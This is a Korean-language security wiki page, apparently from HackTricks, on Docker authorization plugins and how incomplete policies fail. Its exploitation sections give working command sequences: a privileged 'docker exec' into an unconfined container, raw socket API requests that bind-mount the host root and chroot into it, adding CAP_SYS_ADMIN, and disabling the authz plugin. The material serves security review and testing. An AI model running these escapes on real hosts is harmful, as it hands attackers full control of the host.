# 런타임 권한 부여 플러그인

{{#include ../../../banners/hacktricks-training.md}}

## 개요

런타임 권한 부여 플러그인은 호출자가 특정 daemon 작업을 수행할 수 있는지 결정하는 추가 정책 계층입니다. Docker가 대표적인 예입니다. 기본적으로 Docker daemon과 통신할 수 있는 사용자는 사실상 daemon을 폭넓게 제어할 수 있습니다. 권한 부여 플러그인은 인증된 사용자와 요청된 API 작업을 확인한 다음, 정책에 따라 요청을 허용하거나 거부하여 이 모델의 범위를 좁히려 합니다.

공격자가 이미 Docker API에 접근할 수 있거나 `docker` 그룹에 속한 사용자의 권한을 가진 경우, 이 주제는 악용 모델을 바꾸므로 별도 페이지에서 다룰 가치가 있습니다. 이런 환경에서는 더 이상 "daemon에 접근할 수 있는가?"만이 아니라 "daemon이 권한 부여 계층으로 보호되고 있는가? 그렇다면 처리되지 않는 엔드포인트, 취약한 JSON 파싱 또는 플러그인 관리 권한을 통해 그 계층을 우회할 수 있는가?"가 관건입니다.

## 동작 방식

요청이 Docker daemon에 도달하면 권한 부여 하위 시스템은 요청 컨텍스트를 설치된 하나 이상의 플러그인에 전달할 수 있습니다. 플러그인은 인증된 사용자 ID, 요청 세부 정보, 선택된 헤더, 그리고 콘텐츠 유형이 적절한 경우 요청 또는 응답 본문의 일부를 확인합니다. 여러 플러그인을 연계할 수 있으며, 모든 플러그인이 요청을 허용해야 접근이 허가됩니다.

이 모델은 강력해 보이지만, 안전성은 전적으로 정책 작성자가 API를 얼마나 완전하게 이해했는지에 달려 있습니다. `docker run --privileged`를 차단하면서 `docker exec`는 무시하거나, 최상위 `Binds` 같은 다른 JSON 키를 놓치거나, 플러그인 관리를 허용하는 플러그인은 제한이 적용된다는 잘못된 인식을 주면서도 직접적인 권한 상승 경로를 열어둘 수 있습니다.

## 일반적인 플러그인 검토 대상

정책 검토 시 중요한 영역은 다음과 같습니다.

- 컨테이너 생성 엔드포인트
- `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` 및 namespace 공유 옵션과 같은 `HostConfig` 필드
- `docker exec` 동작
- 플러그인 관리 엔드포인트
- 의도된 정책 모델 밖에서 런타임 작업을 간접적으로 트리거할 수 있는 모든 엔드포인트

과거에는 Twistlock의 `authz` 플러그인이나 간단한 교육용 플러그인인 `authobot` 같은 예시를 통해 이 모델을 쉽게 살펴볼 수 있었습니다. 이들의 정책 파일과 코드 경로를 보면 엔드포인트와 작업 간 매핑이 실제로 어떻게 구현되었는지 확인할 수 있었습니다. 보안 평가에서 중요한 점은 정책 작성자가 가장 눈에 띄는 CLI 명령뿐 아니라 전체 API 표면을 이해해야 한다는 것입니다.

## 악용

첫 번째 목표는 실제로 무엇이 차단되는지 파악하는 것입니다. daemon이 작업을 거부하면 오류 메시지에서 플러그인 이름이 누출되는 경우가 많으며, 이를 통해 적용 중인 제어를 식별할 수 있습니다.

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

더 폭넓게 endpoint를 프로파일링해야 한다면 `docker_auth_profiler` 같은 도구가 유용합니다. 플러그인에서 실제로 허용하는 API 경로와 JSON 구조를 확인하는 반복 작업을 자동화하기 때문입니다.

환경에서 custom plugin을 사용하고 API와 상호작용할 수 있다면, 실제로 어떤 객체 필드가 필터링되는지 열거하세요:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

이러한 검사가 중요한 이유는 많은 authorization 실패가 개념별이 아니라 필드별로 발생하기 때문입니다. 플러그인은 CLI 패턴을 거부하면서도 이에 해당하는 API 구조는 완전히 차단하지 않을 수 있습니다.

### 전체 예시: 컨테이너 생성 후 `docker exec`로 권한 추가

privileged 컨테이너 생성을 차단하지만 unconfined 컨테이너 생성과 `docker exec`는 허용하는 정책은 여전히 우회될 수 있습니다:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

데몬이 두 번째 단계를 허용하면, 사용자는 정책 작성자가 제한되어 있다고 믿었던 컨테이너 안에서 권한이 있는 대화형 프로세스를 되찾게 됩니다.

호출자가 Docker 소켓에 직접 접근할 수 없는 경우에도 제한된 `sudo` 규칙이 같은 경로를 열어줄 수 있습니다. 예를 들어, root 권한으로 실행되는 `/usr/bin/docker exec *` 허용 규칙이 있으면 호출자가 Docker의 `--privileged` 및 `--user root` 옵션을 지정할 수 있습니다. 실행 중인 컨테이너가 여전히 필요합니다. 일부 Linux 호스트에서는 `docker ps`가 거부될 때 `containerd-shim` 프로세스의 명령줄에서 해당 컨테이너 ID를 확인할 수 있습니다. 이 규칙은 검토의 단서로 취급하세요. 실제 적용되는 sudo 정책, 데몬의 권한 부여 제어, 사용자 네임스페이스, 그리고 결과로 생성되는 프로세스가 호스트 장치나 쓰기 가능한 호스트 마운트에 접근할 수 있는지 확인하세요. Docker는 [CLI reference](https://docs.docker.com/reference/cli/docker/container/exec/)에서 exec 옵션을 설명합니다.

호출자가 선택한 Compose 파일을 허용하는 root 실행 래퍼는 `privileged: true`만 거부하고 바인드 마운트에 `:ro`를 요구하는 데 그치지 말고, 전체 [Compose service model](https://docs.docker.com/reference/compose-file/services/)을 검증해야 합니다. `cap_add`, `security_opt`, 장치, 네임스페이스, 빌드 입력, 지원되는 모든 볼륨 구문을 검토하세요. 읽기 전용 바인드 마운트도 적절한 capability와 느슨한 보안 격리가 설정된 컨테이너 안에서는 쓰기 가능해질 수 있으며, 이는 데몬과 커널 정책에 따라 달라집니다. 호스트 경로의 접두사만 확인하는 허용 목록과 최종 경로 구성 요소에 대한 심볼릭 링크 검사도 검토해야 합니다. sudo 규칙과 명시적인 `docker-compose up` 호출은 검토 대상일 뿐이며, 악용 가능성은 래퍼의 실제 검증 방식과 런타임 데몬 제한에 따라 결정됩니다.

### 전체 예시: Raw API를 통한 바인드 마운트

일부 취약한 정책은 JSON 형식 하나만 검사합니다. root 파일 시스템 바인드 마운트가 일관되게 차단되지 않으면 호스트가 여전히 마운트될 수 있습니다:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

같은 개념이 `HostConfig` 아래에도 나타날 수 있습니다:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

영향은 호스트 파일 시스템 전체를 탈출하는 것입니다. 흥미로운 점은 우회가 kernel bug가 아니라 불완전한 정책 적용 범위에서 비롯된다는 것입니다.

### 전체 예제: 검사되지 않은 capability 속성

정책에서 capability 관련 속성을 필터링하지 않으면, 공격자는 위험한 capability를 다시 얻는 컨테이너를 생성할 수 있습니다:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

`CAP_SYS_ADMIN` 또는 이에 준하는 강력한 capability가 있으면 [capabilities.md](protections/capabilities.md)와 [privileged-containers.md](privileged-containers.md)에 설명된 여러 breakout 기법을 사용할 수 있습니다.

### 전체 예시: 플러그인 비활성화

플러그인 관리 작업이 허용된다면, 가장 깔끔한 우회 방법은 제어 기능을 완전히 끄는 것입니다:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

이는 control-plane 수준의 정책 실패입니다. 권한 부여 계층은 존재하지만, 제한하려던 사용자에게는 여전히 이를 비활성화할 권한이 남아 있습니다.

## 점검

이 명령어들은 정책 계층이 존재하는지, 그리고 그 계층이 완전한지 아니면 형식적인 수준에 그치는지 확인하기 위한 것입니다.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

여기서 흥미로운 점은 다음과 같습니다.

- 플러그인 이름이 포함된 거부 메시지는 권한 부여 계층이 있음을 확인해 주며, 정확한 구현을 드러내는 경우가 많습니다.
- 공격자에게 플러그인 목록이 보인다면 비활성화 또는 재구성 작업이 가능한지 알아내기에 충분할 수 있습니다.
- 명백한 CLI 작업만 차단하고 원시 API 요청은 차단하지 않는 정책은, 우회할 수 없다는 점이 입증되기 전까지 우회 가능하다고 간주해야 합니다.

## 런타임 기본 설정

| 런타임 / 플랫폼 | 기본 상태 | 기본 동작 | 흔히 수동으로 약화하는 방법 |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 활성화되지 않음 | 권한 부여 플러그인이 구성되어 있지 않으면 데몬 접근 권한은 사실상 전부 허용되거나 전부 차단됨 | 불완전한 플러그인 정책, 허용 목록 대신 차단 목록 사용, 플러그인 관리 허용, 필드 수준의 사각지대 |
| Podman | 일반적인 직접 대응 기능이 없음 | Podman은 일반적으로 Docker 스타일 authz 플러그인보다 Unix 권한, rootless 실행, API 노출 설정에 더 많이 의존함 | rootful Podman API를 광범위하게 노출, 소켓 권한을 약하게 설정 |
| containerd / CRI-O | 제어 모델이 다름 | 이러한 런타임은 대개 Docker authz 플러그인보다 소켓 권한, 노드 신뢰 경계, 상위 계층 오케스트레이터 제어에 의존함 | 워크로드에 소켓 마운트, 노드 로컬 신뢰 가정을 약하게 설정 |
| Kubernetes | Docker authz 플러그인이 아닌 API 서버 및 kubelet 계층의 authn/authz 사용 | 클러스터 RBAC와 admission 제어가 주요 정책 계층임 | 과도한 RBAC 권한, 취약한 admission 정책, kubelet 또는 런타임 API 직접 노출 |

{{#include ../../../banners/hacktricks-training.md}}
